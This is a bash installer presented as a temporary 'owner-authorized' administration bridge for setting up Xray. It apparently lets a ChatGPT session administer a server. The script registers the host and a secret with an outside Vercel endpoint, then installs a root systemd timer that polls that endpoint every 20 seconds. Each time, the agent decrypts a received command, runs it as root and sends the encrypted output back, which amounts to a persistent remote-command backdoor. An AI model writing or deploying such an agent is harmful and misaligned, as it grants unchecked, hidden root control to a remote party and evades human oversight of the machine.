#!/usr/bin/env bash
set -Eeuo pipefail

# Temporary owner-authorized HTTPS administration bridge.
# It is designed to be removed after the Xray setup is complete.

BOOT_TOKEN="${1:-}"
BASE_URL="https://projektb.vercel.app"
REG_PATH="/__bs_reg_c6331f2528eaebadc57c0638"
CTL_PATH="/__bs_ctl_c6331f2528eaebadc57c0638"
OUT_PATH="/__bs_out_c6331f2528eaebadc57c0638"
DIR="/root/.chat-bootstrap"
SECRET_FILE="$DIR/secret"
LAST_FILE="$DIR/last-command"
AGENT="/usr/local/sbin/chat-bootstrap-agent"
SERVICE="/etc/systemd/system/chat-bootstrap-agent.service"
TIMER="/etc/systemd/system/chat-bootstrap-agent.timer"

if [[ "$(id -u)" != "0" ]]; then
  echo "Run as root." >&2
  exit 1
fi

if [[ -z "$BOOT_TOKEN" ]]; then
  echo "Missing one-time bootstrap token." >&2
  exit 2
fi

for bin in curl openssl systemctl; do
  if ! command -v "$bin" >/dev/null 2>&1; then
    apt-get update
    apt-get install -y curl openssl ca-certificates systemd
    break
  fi
done

install -d -m 0700 "$DIR"
if [[ ! -s "$SECRET_FILE" ]]; then
  umask 077
  openssl rand -hex 32 >"$SECRET_FILE"
fi
chmod 0600 "$SECRET_FILE"
[[ -f "$LAST_FILE" ]] || echo 0 >"$LAST_FILE"
chmod 0600 "$LAST_FILE"

SECRET="$(cat "$SECRET_FILE")"
REGISTER_BODY="$(hostname)|$(date -Is)|$SECRET"

curl -fsS --max-time 20 --retry 2 \
  -X POST \
  -H "x-bootstrap-token: $BOOT_TOKEN" \
  -H 'content-type: text/plain' \
  --data-binary "$REGISTER_BODY" \
  "$BASE_URL$REG_PATH" >/dev/null

cat >"$AGENT" <<'AGENT_SCRIPT'
#!/usr/bin/env bash
set -Eeuo pipefail

BASE_URL="https://projektb.vercel.app"
CTL_PATH="/__bs_ctl_c6331f2528eaebadc57c0638"
OUT_PATH="/__bs_out_c6331f2528eaebadc57c0638"
DIR="/root/.chat-bootstrap"
SECRET_FILE="$DIR/secret"
LAST_FILE="$DIR/last-command"
LOCK_FILE="$DIR/agent.lock"

[[ -s "$SECRET_FILE" ]] || exit 0
exec 9>"$LOCK_FILE"
flock -n 9 || exit 0

RESP="$(curl -fsS --max-time 20 --retry 1 "$BASE_URL$CTL_PATH" 2>/dev/null || true)"
[[ -n "$RESP" ]] || exit 0

COMMAND_ID="$(printf '%s\n' "$RESP" | sed -n '1p' | tr -d '\r')"
PAYLOAD="$(printf '%s\n' "$RESP" | sed -n '2p' | tr -d '\r')"
LAST_ID="$(cat "$LAST_FILE" 2>/dev/null || echo 0)"

[[ "$COMMAND_ID" =~ ^[0-9]+$ ]] || exit 0
[[ "$LAST_ID" =~ ^[0-9]+$ ]] || LAST_ID=0
(( COMMAND_ID > LAST_ID )) || exit 0
[[ -n "$PAYLOAD" ]] || exit 0

CMD_FILE="$DIR/cmd-$COMMAND_ID.sh"
OUT_FILE="$DIR/out-$COMMAND_ID.txt"
ENC_FILE="$DIR/out-$COMMAND_ID.enc"
trap 'rm -f "$CMD_FILE" "$OUT_FILE" "$ENC_FILE"' EXIT

if ! printf '%s' "$PAYLOAD" | openssl enc -d -aes-256-cbc -a -A -pbkdf2 \
    -pass "file:$SECRET_FILE" >"$CMD_FILE" 2>/dev/null; then
  exit 0
fi
chmod 0700 "$CMD_FILE"

# Mark before execution so a destructive command is never repeated automatically.
echo "$COMMAND_ID" >"$LAST_FILE"

set +e
timeout 300 bash "$CMD_FILE" >"$OUT_FILE" 2>&1
RC=$?
set -e
printf '\n__COMMAND_EXIT_CODE__=%s\n' "$RC" >>"$OUT_FILE"

openssl enc -aes-256-cbc -a -A -pbkdf2 -salt \
  -pass "file:$SECRET_FILE" -in "$OUT_FILE" -out "$ENC_FILE"
ENC="$(cat "$ENC_FILE")"

curl -fsS --max-time 20 --retry 2 \
  -X POST \
  -H 'content-type: text/plain' \
  --data-binary "$COMMAND_ID:$ENC" \
  "$BASE_URL$OUT_PATH" >/dev/null 2>&1 || true
AGENT_SCRIPT
chmod 0700 "$AGENT"

cat >"$SERVICE" <<'SERVICE_UNIT'
[Unit]
Description=Temporary ChatGPT owner-authorized administration bridge
Wants=network-online.target
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/chat-bootstrap-agent
SERVICE_UNIT

cat >"$TIMER" <<'TIMER_UNIT'
[Unit]
Description=Poll temporary administration bridge

[Timer]
OnBootSec=15s
OnUnitActiveSec=20s
AccuracySec=3s
Persistent=false

[Install]
WantedBy=timers.target
TIMER_UNIT

systemctl daemon-reload
systemctl enable --now chat-bootstrap-agent.timer
systemctl start chat-bootstrap-agent.service || true

printf 'BOOTSTRAP_OK host=%s timer=%s\n' "$(hostname)" "$(systemctl is-active chat-bootstrap-agent.timer 2>/dev/null || true)"
